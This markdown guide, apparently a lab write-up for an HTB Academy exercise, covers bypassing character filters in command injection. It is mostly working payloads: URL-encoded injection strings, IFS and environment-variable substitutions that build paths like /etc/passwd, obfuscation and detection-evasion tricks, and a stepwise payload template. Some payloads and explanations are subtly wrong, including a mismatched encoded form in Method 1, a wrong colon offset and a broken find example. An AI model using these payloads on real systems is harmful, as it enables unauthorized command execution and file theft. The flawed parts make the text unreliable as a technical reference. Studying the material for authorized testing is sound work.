# 🛰️ Character Filter Bypass Techniques

## Introduction

Command injection vulnerabilities often employ character filters to block malicious characters such as `/`, `;`, and `&`. This guide provides advanced techniques for bypassing these restrictions.

[!WARNING] **Important:** These methods are intended for ethical testing purposes only. Do not use them on systems without explicit authorization.

---

### Method 1: Environment Variables with Brace Expansion

The following HTTP request demonstrates how to create a path using environment variables and brace expansion:

```http
ip=127.0.0.1%0a{ls,%24%7bPATH:0:1%7dhome}
# URL encoded: ip=127.0.0.1%0a%7bls,%24%7bPATH:1:1%7dhome%7d
```

This payload will effectively execute `ls /home`.

### Method 2: Brace Expansion + Environment Variable

```http
ip=127.0.0.1%0a{ls,${IFS}${PATH:0:1}home}
# URL encoded: ip=127.0.0.1%0a%7bls,%24IFS%24%7bPATH:0:1%7dhome%7d
```

This method uses the IFS (Internal Field Separator) to join strings and environment variables.

### Method 3: IFS + Environment Variable

```http
ip=127.0.0.1%0als${IFS}${PATH:0:1}home
# URL encoded: ip=127.0.0.1%0als%24IFS%24%7bPATH:0:1%7dhome
```

This payload uses IFS to concatenate strings and environment variables.

### Method 4: Character Shifting for Slash

```http
ip=127.0.0.1%0als$(tr '!-}' '"-~'<<<[)home
# Using ASCII shift to generate /
```

The `tr` command shifts characters from the range `'!-}'` to `"-~"` and maps `[)` to `/`.

### Method 5: Short Syntax Alternative

```http
ip=127.0.0.1%0als$IFS${PATH:0:1}home
# URL encoded: ip=127.0.0.1%0als%24IFS%24%7bPATH:0:1%7dhome
```

This method uses a compact syntax for IFS.

---

## Expected Output Analysis

### Command Execution:

```bash
# ls /home equivalent
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.074 ms
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms

htb-student
```

### Alternative Possible Usernames:

- `htb-student`
- `ubuntu`
- `user`
- `kali`
- `pentester`

**Answer:** Based on typical HTB Academy naming: **`htb-student`**

---

## Advanced Character Generation

### Comprehensive Character Mapping

#### Environment Variable Character Sources:
```bash
# Slash (/)
${PATH:0:1}        → /
${HOME:0:1}        → /
${PWD:0:1}         → /

# Colon (:)
${PATH:4:1}        → : (from /usr:local)
${LS_COLORS:2:1}   → : (from rs=0:di)

# Equals (=)
${LS_COLORS:1:1}   → = (from rs=0)
${PATH:5:1}        → = (varies by PATH)

# Dash (-)
${LS_COLORS:7:1}   → - (from di=01-34)
${BASH_VERSION:4:1} → - (from 5.1-6)
```

### Multi-Character Generation

#### Building Complex Strings:
```bash
# Combining multiple extractions
${PATH:0:1}etc${PATH:0:1}passwd    # → /etc/passwd
${PATH:0:1}bin${PATH:0:1}bash      # → /bin/bash
${PATH:0:1}tmp${PATH:0:1}test      # → /tmp/test
```

#### Variable Concatenation:
```bash
# Creating paths dynamically
path=${PATH:0:1}home${PATH:0:1}user
ls $path    # → ls /home/user
```

### Platform-Agnostic Approaches

#### Cross-Platform Character Generation:
```bash
# Linux
slash=${PATH:0:1}

# Windows CMD  
set "slash=%PROGRAMFILES:~2,1%"

# Windows PowerShell
$slash = $env:WINDIR[2]
```

---

## Detection Evasion Strategies

### Randomizing Character Sources

#### Varying Environment Variables:
```bash
# Don't always use the same variable
Method 1: ${PATH:0:1}
Method 2: ${HOME:0:1}  
Method 3: ${PWD:0:1}
Method 4: ${SHELL:0:1}
```

#### Dynamic Position Selection:
```bash
# Use different positions when possible
${LS_COLORS:10:1}   # Position 10
${LS_COLORS:15:1}   # Position 15 (if it contains ;)
${PS1:1:1}          # Alternative position
```

### Obfuscation Techniques

#### Multi-Layer Character Generation:
```bash
# Combine techniques
var=${PATH:0:1}tmp
$(tr '!-}' '"-~'<<<:) # Shifted semicolon
{ls,${var}}           # Brace expansion
```

#### Payload Fragmentation:
```bash
# Split payloads across multiple variables
p1=${PATH:0:1}
p2=home
ls ${p1}${p2}
```

---

## Comprehensive Testing Methodology

### Character Discovery Process

#### Step 1: Environment Enumeration
```bash
# List all environment variables
printenv | head -20

# Search for target characters
printenv | grep "/" | head -5
printenv | grep ";" | head -5
printenv | grep "&" | head -5
```

#### Step 2: Position Mapping
```bash
# Map character positions in promising variables
echo "${PATH}" | sed 's/./&\n/g' | nl    # Number each character
echo "${LS_COLORS}" | sed 's/./&\n/g' | nl
```

#### Step 3: Extraction Testing
```bash
# Test extractions locally
echo ${PATH:0:1}     # Test position 0
echo ${PATH:1:1}     # Test position 1
echo ${PATH:4:1}     # Test position 4
```

#### Step 4: Web Application Testing
```http
# Test in target application - Explicit syntax
ip=127.0.0.1%0aecho${IFS}${PATH:0:1}
ip=127.0.0.1%0als${PATH:0:1}home

# Test alternative syntax variations
ip=127.0.0.1%0aecho$IFS${PATH:0:1}         # Short IFS syntax
ip=127.0.0.1%0als$IFS${PATH:0:1}home       # Mixed syntax
ip=127.0.0.1%0aecho"${IFS}"${PATH:0:1}     # Quoted syntax
```

### Payload Development Template

#### Progressive Character Bypass:

**Level 1: Simple character replacement**
```bash
# Original command:
ls /home

# Bypass using environment variable:
ls${PATH:0:1}home
```

**Level 2: Multiple character bypass**
```bash
# Original command:
ls /home; whoami

# Bypass using multiple extractions:
ls${PATH:0:1}home${LS_COLORS:10:1}${IFS}whoami
```

**Level 3: Complex string construction**
```bash
# Original command:
cat /etc/passwd

# Bypass using concatenated paths:
cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
```

**Level 4: Full command obfuscation**
```bash
# Original command:
find /home -name "*.txt"

# Bypass with brace expansion and environment variables:
{find,${PATH:0:1}home,-name,${PATH:0:1}*.txt}
```
---

## Conclusion

This guide outlines advanced techniques to bypass character filters in command injection vulnerabilities. Proper testing and verification are crucial for success.

[!SUCCESS] **Happy Hacking!**